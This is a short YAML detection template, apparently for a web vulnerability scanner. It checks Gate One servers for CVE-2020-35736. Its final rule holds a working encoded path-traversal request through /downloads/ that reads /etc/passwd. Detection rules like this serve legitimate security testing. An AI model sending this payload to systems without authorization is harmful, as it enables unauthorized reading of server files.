name: gateone-cve-2020-35736
rules:
  - method: GET
    path: "/auth?next=%2F"
    follow_redirects: false
    expression: response.status == 302
  - method: GET
    path: "/"
    expression: response.body.bcontains(b"Gate One")
  - method: GET
    path: "/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
    follow_redirects: true
    expression: |
      r'root:[x*]:0:0:'.bmatches(response.body)&&response.status == 200&& response.headers["Content-Type"].contains(string("text/html"))
detail:
  author: tangshoupu
  links: https://github.com/liftoff/GateOne
